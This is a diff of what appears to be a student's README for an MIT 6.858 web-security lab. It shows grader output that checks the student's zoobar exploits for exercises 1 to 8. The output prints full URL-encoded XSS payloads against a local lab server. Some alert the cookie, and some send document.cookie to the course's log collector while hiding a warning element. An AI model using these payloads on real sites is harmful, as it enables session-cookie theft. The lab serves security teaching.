@@ -17,13 +17,10 @@ $ make check
 
 Test Results: 
  
-(output lines with `[ ???? ]` indicate that the result must be checked manually by the grader)
+(output lines with `[ ???? ]` indicate that the result must be checked manually by the course grader)
 
 ```$xslt
 student@6858-v20:~/lab$ make check
-cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd.o zookd.c
-cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http.o http.c
-cc -m64  zookd.o http.o   -o zookd
 ./check-lab4.sh
 Generating reference images...
 Registering as grader, graderpassword
@@ -34,27 +31,44 @@ Registering as grader3, password3
 [ INFO ]: Testing exploit for Exercise 1...
 Registering as grader, graderpassword
 Registering as attacker, attackerpassword
-Expecting cookie: grader#527dd40f6b16d560a6f57445aeeb7fa4
-[ PASS ]: alert contains: grader#527dd40f6b16d560a6f57445aeeb7fa4
+Expecting cookie: grader#1477552cbb6dfd457241c2cc56bc3e90
+[ PASS ]: alert contains: grader#1477552cbb6dfd457241c2cc56bc3e90
 [ INFO ]: Testing exploit for Exercise 2...
 Registering as grader, graderpassword
 Registering as attacker, attackerpassword
-[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#0a1fce4e0636ba0efe10a5958388a776'
+[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#42e300b5713788f6b0b8def8fdb7b841'
 [ INFO ]: Testing exploit for Exercise 3...
 Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22alert(document.cookie)%22%20autofocus=%22&random=3
 Registering as grader, graderpassword
 Registering as attacker, attackerpassword
-Expecting cookie: grader#cedd47e03e73b746696d551d69462603
-[ PASS ]: alert contains: grader#cedd47e03e73b746696d551d69462603
+Expecting cookie: grader#fadb2d9c086b832f876cd867e0afdce4
+[ PASS ]: alert contains: grader#fadb2d9c086b832f876cd867e0afdce4
 [ INFO ]: Testing exploit for Exercise 4...
 Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3B%22%20autofocus=%22&random=3
 Registering as grader, graderpassword
 Registering as attacker, attackerpassword
-[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#887bdbc37577aee3f6f9891357aacfd0'
+[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#4a37759281624413966ac76dbe6a7010'
 [ INFO ]: Testing exploit for Exercise 5...
 Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus%3D%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3Bwindow.onload%20%3D%20function()%20%7Bdocument.getElementsByClassName(%27warning%27)%5B0%5D.style.display%20%3D%20%27none%27%3B%7D%22%20autofocus%3D%22
 Registering as grader, graderpassword
 Registering as attacker, attackerpassword
-[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#d6bcc2e503b55d862f45a5d595bd4540'
+[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#e2a2cebedd95ec484acb6574237c2f8c'
 [ PASS ]: ./lab4-tests/answer-5.png matched reference image (557200 non-background pixels)
+[ INFO ]: Testing exploit for Exercise 6...
+Registering as grader, graderpassword
+Registering as attacker, attackerpassword
+[ PASS ]: grader zoobar count
+[ PASS ]: attacker zoobar count
+[ INFO ]: Testing exploit for Exercise 7...
+Registering as grader, graderpassword
+Registering as attacker, attackerpassword
+[ PASS ]: grader zoobar count
+[ PASS ]: attacker zoobar count
+[ INFO ]: Testing exploit for Exercise 8...
+Registering as grader, graderpassword
+Registering as attacker, attackerpassword
+Loading attacker page. If you get a timeout here you're not redirecting to http://css.csail.mit.edu/6.858/2020/.
+[ PASS ]: visited final page
+[ PASS ]: grader zoobar count
+[ PASS ]: attacker zoobar count
 ```
